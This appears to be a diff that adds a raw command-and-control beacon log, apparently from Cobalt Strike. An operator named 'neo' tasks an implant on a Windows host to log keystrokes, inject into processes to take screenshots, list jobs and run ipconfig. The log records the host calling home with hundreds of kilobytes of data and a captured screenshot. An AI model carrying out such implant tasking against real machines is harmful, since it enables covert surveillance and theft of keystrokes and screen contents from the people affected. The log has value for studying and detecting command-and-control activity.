@@ -1,0 +1,84 @@
+01/20 17:30:43 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 2720; os: Windows; version: 6.1; beacon arch: x86 (x64)
+01/20 17:31:12 [input] <neo> keylogger 1 x64
+01/20 17:31:12 [task] Tasked beacon to log keystrokes in 1 (x64)
+01/20 17:31:29 [input] <neo> screenshot 2 x64
+01/20 17:31:29 [task] Tasked beacon to take a screenshot in 2/x64
+01/20 17:31:39 [checkin] host called home, sent: 278676 bytes
+01/20 17:31:40 [input] <neo> screenshot 2
+01/20 17:31:40 [task] Tasked beacon to take a screenshot in 2/x86
+01/20 17:32:00 [error] could not open process 1: 87
+01/20 17:32:00 [error] Could not connect to pipe: 2
+01/20 17:32:00 [error] could not open process 2: 87
+01/20 17:32:00 [error] Could not connect to pipe: 2
+01/20 17:33:00 [checkin] host called home, sent: 162378 bytes
+01/20 17:33:10 [error] could not open process 2: 87
+01/20 17:33:10 [error] Could not connect to pipe: 2
+01/20 17:34:50 [input] <neo> jobs
+01/20 17:34:50 [task] Tasked beacon to list jobs
+01/20 17:35:10 [checkin] host called home, sent: 8 bytes
+01/20 17:35:10 [output]
+
+
+01/20 17:35:23 [input] <neo> screenshot 80 x64
+01/20 17:35:23 [task] Tasked beacon to take a screenshot in 80/x64
+01/20 17:35:38 [input] <neo> screenshot 2720 x64
+01/20 17:35:38 [task] Tasked beacon to take a screenshot in 2720/x64
+01/20 17:36:10 [checkin] host called home, sent: 394388 bytes
+01/20 17:36:23 [input] <neo> screenshot 2720 x64 1
+01/20 17:36:23 [task] Tasked beacon to take screenshots in 2720/x64 for next 1 seconds
+01/20 17:36:31 [error] could not open process 80: 87
+01/20 17:36:31 [error] Could not connect to pipe: 2
+01/20 17:36:31 [error] 2720 is an x86 process (can't inject x64 content)
+01/20 17:36:31 [error] Could not connect to pipe: 2
+01/20 17:37:07 [input] <neo> screenshot 2720 x86 1
+01/20 17:37:07 [task] Tasked beacon to take screenshots in 2720/x86 for next 1 seconds
+01/20 17:37:31 [checkin] host called home, sent: 359572 bytes
+01/20 17:37:48 [error] 2720 is an x86 process (can't inject x64 content)
+01/20 17:37:48 [error] Could not connect to pipe: 2
+01/20 17:38:03 [input] <neo> jobs
+01/20 17:38:03 [task] Tasked beacon to list jobs
+01/20 17:38:48 [checkin] host called home, sent: 8 bytes
+01/20 17:38:48 [output]
+
+
+01/20 17:40:15 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 2720; os: Windows; version: 6.1; beacon arch: x86 (x64)
+01/20 17:40:35 [input] <neo> shell ipconfig
+01/20 17:40:35 [task] Tasked beacon to run: ipconfig
+01/20 17:41:09 [checkin] host called home, sent: 39 bytes
+01/20 17:41:09 [output]
+received output:
+
+Windows IP 配置
+
+
+以太网适配器 本地连接:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   本地链接 IPv6 地址. . . . . . . . : fe80::dc70:1ea3:67b5:311%11
+   IPv4 地址 . . . . . . . . . . . . : 172.17.2.54
+   子网掩码  . . . . . . . . . . . . : 255.255.254.0
+   默认网关. . . . . . . . . . . . . : 172.17.2.1
+
+隧道适配器 isatap.{A8E7B51B-9069-45DB-BA99-054EA369046E}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+
+01/20 17:42:22 [input] <neo> screenshot 2720 x86 1
+01/20 17:42:22 [task] Tasked beacon to take screenshots in 2720/x86 for next 1 seconds
+01/20 17:42:54 [input] <neo> screenshot 80 x86 1
+01/20 17:42:54 [task] Tasked beacon to take screenshots in 80/x86 for next 1 seconds
+01/20 17:43:09 [checkin] host called home, sent: 324756 bytes
+01/20 17:43:21 [error] could not open process 80: 87
+01/20 17:43:21 [error] Could not connect to pipe: 2
+01/20 17:43:21 [output]
+received screenshot (66210 bytes)
+
+01/20 17:43:43 [input] <neo> jobs
+01/20 17:43:43 [task] Tasked beacon to list jobs
+01/20 17:44:21 [checkin] host called home, sent: 8 bytes
+01/20 17:44:21 [output]
+2	2720	take screenshot
+
+
